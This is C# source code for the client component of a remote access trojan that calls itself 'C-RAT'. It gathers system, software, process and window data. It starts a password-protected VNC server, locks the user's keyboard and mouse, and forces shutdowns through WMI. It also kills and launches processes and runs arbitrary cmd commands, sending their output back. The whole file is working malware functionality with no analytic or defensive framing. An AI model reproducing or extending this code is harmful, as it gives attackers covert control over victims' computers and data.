#region

using System;
using System.Diagnostics;
using System.Management;
using System.Runtime.InteropServices;
using System.Threading;
using Cliente.Common;
using Common.Lib;
using NVNC;

#endregion

namespace Cliente.Negocio
{
    public class NegocioCliente
    {
        public NetData GenerarInformacionDelSistema(int codProtocolo)
        {
            return NetData.GenerarNetDataDesdeObjeto(codProtocolo, new InformacionDelSistema());
        }

        public NetData GenerarPeticionPassword()
        {
            return new NetData((int) Protocolo.Cliente.PedirPassword);
        }

        public void MostrarMsgBox(string msg, string title, int type)
        {
            MiMsgBox.MessageBoxA(0, msg, title, type);
        }

       public void IniciarServidorVnc(String password, int puerto, String nombre)
        {
           Thread hiloServerVNC = new Thread(delegate()
               {
                   new VncServer(password,
                       puerto,
                       "Servidor VNC C-RAT").Start();

               }
           );
           hiloServerVNC.Start();            
        }

        public NetData GenerarInfoSoftwareDelSistema(int codProtocolo)
        {
            return NetData.GenerarNetDataDesdeObjeto(codProtocolo, SoftwareDelSistema.obtenerInstanciaSW());
        }

        public NetData GenerarInfoProcesosDelSistema(int codProtocolo)
        {
            return NetData.GenerarNetDataDesdeObjeto(codProtocolo, ProcesosDelSistema.generarInstanciaProcesos());
        }

        public NetData GenerarInfoVentanasVisibles(int codProtocolo)
        {
            return NetData.GenerarNetDataDesdeObjeto(codProtocolo, new InformacionVentanasSO());
        }

      /*public bool DesinstalarSoftware(string strDesinstalacion)
        {
            return SoftwareData.DesinstalarSoft(strDesinstalacion);
        }*/

        /// <summary>
        /// Realiza la opcion de apagado indicada en el flag.
        /// </summary>
        /// <param name="flagAccion">Accion definida en Commom.Libs.CommonConst.ShutdownConst</param>
        public void RealizarAccionApagado(int flagAccion)
        {
            try
            {
                ManagementBaseObject mboShutdown = null;
                ManagementClass mcWin32 = new ManagementClass("Win32_OperatingSystem");
                mcWin32.Get();
                // habilito permisos de seguridad para poder realizar opciones
                //de apagado en el equipo
                mcWin32.Scope.Options.EnablePrivileges = true;
                ManagementBaseObject mboShutdownParams = mcWin32.GetMethodParameters("Win32Shutdown");
                // indico la accion que quiero realizar mediante el Flag, el Flag corresponde
                //a una constante del paquete Common.Lib.CommonConsts.ShutdownConsts.
                mboShutdownParams["Flags"] = "" + flagAccion;
                mboShutdownParams["Reserved"] = "0";

                //invoco el metodo con los parametros pasados, para las instancias encontradas.
                foreach (ManagementObject manObj in mcWin32.GetInstances())
                {
                    manObj.InvokeMethod("Win32Shutdown", mboShutdownParams, null);
                }
            }
            catch (Exception){            
            }
        }
        /// <summary>
        /// Bloquea/Desbloquea la entrada del sistema (teclado y raton).
        /// 
        /// </summary>
        /// <param name="bloq">true -> Bloquea / flase -> Desbloquea</param> 
        public void BloquearEntradaDelSistema(bool bloq)
        {
            BlockInput(bloq);
        }
        [DllImport("user32.dll")]
        static extern bool BlockInput(bool opcion);

  
        public bool IniciarProceso(string nombreProceso)
        {
            try
            {
                Process nuevoProceso = new Process();
                nuevoProceso.StartInfo.FileName = nombreProceso;
                nuevoProceso.Start();
                return true;
            }
            catch (Exception ex)
            {
                return false;
            }
        }

        public void ProcesarAccionesDeVentana(NetData datoVentana)
        {
            IntPtr handle = new IntPtr(int.Parse(datoVentana.GetDato("Handle")));
            switch (datoVentana.CodigoDeProtocolo)
            {
                case (int)Protocolo.Servidor.MinimizarVentana: //minimizar Ventana                    
                    VentanaData.MinimizarVentanaByHandle(handle);
                    break;
                case (int)Protocolo.Servidor.BloquearVentana:                    
                    VentanaData.BloquearVentanaByHandle(handle);
                    break;
                case (int)Protocolo.Servidor.DesbloquearVentana:                    
                    VentanaData.DesbloquearVentanaByHandle(handle);
                    break;
                case (int)Protocolo.Servidor.CambiarTituloVentana:
                    String titulo = datoVentana.GetDato("NuevoTitulo");
                    VentanaData.CambiarTituloVentanaByHandle(handle,titulo);
                    break;                             
            }            
        }
        public void ProcesarAccionesDeProcesos(NetData datosProc)
        {
            IntPtr handle = new IntPtr(int.Parse(datosProc.GetDato("Id")));
            switch (datosProc.CodigoDeProtocolo)
            {
                case (int)Protocolo.Servidor.MatarProceso: //minimizar Ventana                    
                    ProcesosDelSistema.MatarProceso(handle.ToString());
                    break;
                case (int)Protocolo.Servidor.EjecutarProceso:
                    ProcesosDelSistema.IniciarProceso(datosProc.GetDato("NombreProceso"), false);
                    break;
            }
        }
        public void AbrirPaginaWeb(string url)
        {
            Process.Start(url);
        }

        public string ObtenerRespuestaComandoCmd(string comando)
        {
            ProcessStartInfo info = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + comando);            
            info.RedirectStandardOutput = true;
            info.RedirectStandardInput = true;
            info.RedirectStandardError = true;
            info.UseShellExecute = false;            
            info.CreateNoWindow = false;            
            System.Diagnostics.Process consola = new System.Diagnostics.Process();
            consola.StartInfo = info;
            consola.Start();            
            string result = consola.StandardOutput.ReadToEnd();
            return result;
        }
    }
}